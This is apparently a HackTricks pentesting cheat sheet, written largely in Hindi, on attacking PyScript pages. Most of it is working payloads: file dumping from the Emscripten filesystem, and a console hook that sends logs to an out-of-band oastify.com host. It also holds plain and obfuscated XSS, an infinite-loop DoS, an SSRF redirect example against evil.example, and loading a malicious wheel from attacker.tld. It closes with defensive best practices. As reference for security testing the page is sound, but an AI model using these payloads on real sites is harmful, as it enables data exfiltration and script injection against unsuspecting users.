# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Guide

PyScript HTML में Python को integrate करने के लिए विकसित किया गया एक नया framework है, इसलिए इसका उपयोग HTML के साथ किया जा सकता है। इस cheat sheet में, आपको अपने penetration testing उद्देश्यों के लिए PyScript का उपयोग करने का तरीका मिलेगा।

### Emscripten virtual memory filesystem से files Dumping / Retrieving:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
परिणाम:

![PyScript Pentesting Guide - Emscripten virtual memory filesystem से files Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
परिणाम:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (सामान्य)

कोड:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
परिणाम:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

कोड:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Result:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
परिणाम:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

कोड:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
परिणाम:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## नई vulnerabilities & techniques (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 < 2.5.0` PyScript के साथ आने वाले **Pyodide runtime** के अंदर execute होने पर `redirect` और `retries` parameters को अनदेखा करता है। जब कोई attacker target URLs को प्रभावित कर सकता है, तो वह Python code को cross-domain redirects follow करने के लिए मजबूर कर सकता है, भले ही developer ने उन्हें स्पष्ट रूप से disabled किया हो - प्रभावी रूप से anti-SSRF logic को bypass करते हुए।<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
`urllib3 2.5.0` में patch किया गया है – अपने PyScript image में package को upgrade करें या `packages = ["urllib3>=2.5.0"]` में एक सुरक्षित version pin करें। विवरण के लिए official CVE entry देखें।

### Arbitrary package loading & supply-chain attacks

चूंकि PyScript `packages` list में arbitrary URLs की अनुमति देता है, इसलिए configuration को modify या inject कर सकने वाला malicious actor victim के browser में **पूरी तरह arbitrary Python** execute कर सकता है:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*केवल pure-Python wheels आवश्यक हैं – WebAssembly compilation step की जरूरत नहीं है। सुनिश्चित करें कि configuration user-controlled न हो और trusted wheels को HTTPS और SRI hashes के साथ अपने domain पर host करें।

### Output sanitisation में बदलाव (2023+)

* `print()` अभी भी raw HTML inject करता है और इसलिए XSS-prone है (ऊपर दिए गए examples)।
* नया `display()` helper default रूप से HTML को escape करता है – raw markup को `pyscript.HTML()` में wrap करना आवश्यक है।
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
यह व्यवहार 2023 में पेश किया गया था और आधिकारिक Built-ins guide में documented है। untrusted input के लिए `display()` पर निर्भर रहें और सीधे `print()` को call करने से बचें।<sup>[[2]](#references)</sup>

---

## Defensive Best Practices

* **Packages को up to date रखें** – `urllib3 >= 2.5.0` पर upgrade करें और site के साथ ship होने वाले wheels को नियमित रूप से rebuild करें।
* **Package sources को restrict करें** – केवल PyPI names या same-origin URLs को reference करें, और ideally उन्हें Sub-resource Integrity (SRI) से protect करें।
* **Content Security Policy को harden करें** – inline JavaScript (`script-src 'self' 'sha256-…'`) को disallow करें, ताकि injected `<script>` blocks execute न हो सकें।
* **User-supplied `<py-script>` / `<script type="py">` tags को disallow करें** – HTML को अन्य users को echo करने से पहले server पर sanitise करें।
* **Workers को isolate करें** – यदि आपको workers से DOM का synchronous access आवश्यक नहीं है, तो `sync_main_only` flag enable करें, ताकि `SharedArrayBuffer` header requirements से बचा जा सके।

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
